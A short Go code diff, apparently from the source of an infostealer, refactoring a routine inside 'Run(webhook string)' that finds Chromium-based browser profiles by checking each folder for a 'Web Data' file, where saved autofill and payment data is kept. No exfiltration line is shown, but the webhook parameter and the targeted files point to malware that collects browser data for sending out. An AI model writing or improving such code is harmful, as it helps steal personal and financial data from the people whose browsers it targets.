@@ -110,18 +110,14 @@ func Run(webhook string) {
 				}
 				for _, folder := range folders {
 					if folder.IsDir() {
-						files, err := os.ReadDir(filepath.Join(path, folder.Name()))
-						if err != nil {
-							continue
-						}
-						for _, file := range files {
-							if file.Name() == "Web Data" {
-								profiles = append(profiles, browsers.Profile{
-									Name:    folder.Name(),
-									Path:    filepath.Join(path, folder.Name()),
-									Browser: browsers.Browser{Name: "Chromium"},
-								})
-							}
+						dir := filepath.Join(path, folder.Name())
+
+						if fileutil.Exists(filepath.Join(dir, "Web Data")) {
+							profiles = append(profiles, browsers.Profile{
+								Name:    folder.Name(),
+								Path:    dir,
+								Browser: browsers.Browser{Name: name},
+							})
 						}
 					}
 				}
